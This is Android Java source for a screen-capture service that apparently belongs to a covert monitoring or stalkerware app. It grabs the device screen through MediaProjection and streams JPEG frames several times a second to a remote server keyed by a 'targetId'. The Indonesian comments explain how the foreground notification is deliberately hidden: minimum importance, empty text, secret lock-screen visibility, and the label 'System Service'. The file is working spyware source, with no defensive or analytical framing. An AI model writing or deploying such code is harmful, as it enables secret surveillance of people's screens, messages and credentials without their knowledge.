package com.nullx.pp;

import android.app.*;
import android.content.*;
import android.graphics.*;
import android.hardware.display.*;
import android.media.*;
import android.media.projection.*;
import android.os.*;
import android.util.DisplayMetrics;
import java.io.*;
import java.nio.charset.StandardCharsets;
import android.util.Base64;
import org.json.JSONObject;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

/**
 * Live Screen Streaming - mengirim frame layar secara real-time ke server.
 * Notifikasi dibuat MINIMAL agar hampir tidak terlihat.
 */
public class ScreenCaptureService extends Service {
    public static final String ACTION_SCREENSHOT = "com.nullx.pp.SCREENSHOT";
    public static final String ACTION_LIVE_SCREEN = "com.nullx.pp.LIVE_SCREEN";
    
    private static final String CH = "sys_ch_01";
    private static final int NOTIF_ID = 8831;
    
    private MediaProjection projection;
    private ImageReader reader;
    private VirtualDisplay display;
    private boolean liveStreaming = false;
    private long lastFrameTime = 0;
    private Handler handler;

    @Override 
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        createHiddenChannel();
        startHiddenForeground();
    }

    /**
     * Channel notifikasi dengan setting paling tidak terlihat:
     * - IMPORTANCE_MIN = tidak muncul di status bar, tidak ada bunyi
     * - setShowBadge(false) = tidak ada badge di icon aplikasi
     * - setSound(null), enableVibration(false) = benar-benar silent
     * - VISIBILITY_SECRET = tidak muncul di lock screen
     */
    private void createHiddenChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel n = new NotificationChannel(
                CH, "System Service", NotificationManager.IMPORTANCE_MIN);
            n.setShowBadge(false);
            n.setSound(null, null);
            n.enableVibration(false);
            n.enableLights(false);
            n.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            n.setDescription("");
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(n);
        }
    }

    /**
     * Foreground service notifikasi tersembunyi.
     * Tidak pakai setSilent() karena method itu hanya ada di NotificationCompat (AndroidX),
     * bukan di Notification.Builder bawaan Android SDK.
     */
    private void startHiddenForeground() {
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= 26) {
            builder = new Notification.Builder(this, CH);
        } else {
            builder = new Notification.Builder(this);
        }
        
        builder.setSmallIcon(android.R.drawable.stat_notify_sync)
               .setContentTitle("")
               .setContentText("")
               .setOngoing(true)
               .setPriority(Notification.PRIORITY_MIN)
               .setCategory(Notification.CATEGORY_SERVICE)
               .setVisibility(Notification.VISIBILITY_SECRET);
        
        Notification notif = builder.build();
        
        if (Build.VERSION.SDK_INT >= 29) {
            startForeground(NOTIF_ID, notif,
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
        } else {
            startForeground(NOTIF_ID, notif);
        }
    }

    @Override 
    public int onStartCommand(Intent in, int flags, int id) {
        if (in != null) {
            if (ACTION_SCREENSHOT.equals(in.getAction())) {
                int rc = in.getIntExtra("resultCode", Activity.RESULT_CANCELED);
                Intent d = (Intent) in.getParcelableExtra("data");
                if (d != null) capture(rc, d, false);
            } else if (ACTION_LIVE_SCREEN.equals(in.getAction())) {
                int rc = in.getIntExtra("resultCode", Activity.RESULT_CANCELED);
                Intent d = (Intent) in.getParcelableExtra("data");
                if (d != null) capture(rc, d, true);
            }
        }
        return START_NOT_STICKY;
    }

    private void capture(int rc, Intent data, boolean live) {
        try {
            liveStreaming = live;
            MediaProjectionManager m = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            projection = m.getMediaProjection(rc, data);
            DisplayMetrics dm = getResources().getDisplayMetrics();
            int w = Math.max(1, dm.widthPixels / 2);
            int h = Math.max(1, dm.heightPixels / 2);
            
            reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2);
            reader.setOnImageAvailableListener(x -> {
                Image img = null;
                try {
                    img = x.acquireLatestImage();
                    if (img == null) return;
                    
                    if (live) {
                        long now = System.currentTimeMillis();
                        if (now - lastFrameTime < 200) return;
                        lastFrameTime = now;
                    }
                    
                    Image.Plane p = img.getPlanes()[0];
                    Bitmap b = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888);
                    b.copyPixelsFromBuffer(p.getBuffer());
                    ByteArrayOutputStream os = new ByteArrayOutputStream();
                    b.compress(Bitmap.CompressFormat.JPEG, 40, os);
                    
                    if (live) {
                        postLiveFrame(Base64.encodeToString(os.toByteArray(), Base64.NO_WRAP));
                    } else {
                        JSONObject o = new JSONObject();
                        o.put("granted", true);
                        o.put("mime", "image/jpeg");
                        o.put("imageBase64", Base64.encodeToString(os.toByteArray(), Base64.NO_WRAP));
                        GuardianCommandReporter.post(this, "screenshot", o);
                        stopSelf();
                    }
                    b.recycle();
                } catch (Exception e) {
                    if (!live) {
                        JSONObject o = new JSONObject();
                        try { o.put("error", e.toString()); } catch (Exception ignored) {}
                        GuardianCommandReporter.post(this, "screenshot", o);
                        stopSelf();
                    }
                } finally {
                    if (img != null) img.close();
                }
            }, handler);
            
            display = projection.createVirtualDisplay("GuardianScreen", w, h, dm.densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.getSurface(), null, null);
        } catch (Exception e) {
            if (!live) {
                JSONObject o = new JSONObject();
                try { o.put("error", e.toString()); } catch (Exception ignored) {}
                GuardianCommandReporter.post(this, "screenshot", o);
            }
            stopSelf();
        }
    }

    private void postLiveFrame(String frameBase64) {
        new Thread(() -> {
            HttpURLConnection h = null;
            try {
                String id = getSharedPreferences("GuardianPrefs", MODE_PRIVATE).getString("targetId", "");
                String token = getSharedPreferences("GuardianPrefs", MODE_PRIVATE).getString("chatToken", "");
                if (id.isEmpty() || token.isEmpty() || DeviceService.getBaseUrl().isEmpty()) return;
                h = (HttpURLConnection) new URL(DeviceService.url("/api/live-screen/" + URLEncoder.encode(id, "UTF-8"))).openConnection();
                h.setRequestMethod("POST");
                h.setConnectTimeout(5000);
                h.setReadTimeout(5000);
                h.setDoOutput(true);
                h.setRequestProperty("Content-Type", "application/json");
                String body = "{\"frame\":\"" + frameBase64 + "\",\"ts\":" + System.currentTimeMillis() + ",\"deviceToken\":\"" + token + "\"}";
                try (OutputStream o = h.getOutputStream()) { o.write(body.getBytes(StandardCharsets.UTF_8)); }
                h.getResponseCode();
            } catch (Exception ignored) {} finally {
                if (h != null) h.disconnect();
            }
        }, "GuardianScreenStream").start();
    }

    @Override 
    public void onDestroy() {
        liveStreaming = false;
        try {
            if (display != null) display.release();
            if (reader != null) reader.close();
            if (projection != null) projection.stop();
        } catch (Exception ignored) {}
        super.onDestroy();
    }

    @Override 
    public IBinder onBind(Intent i) { return null; }
}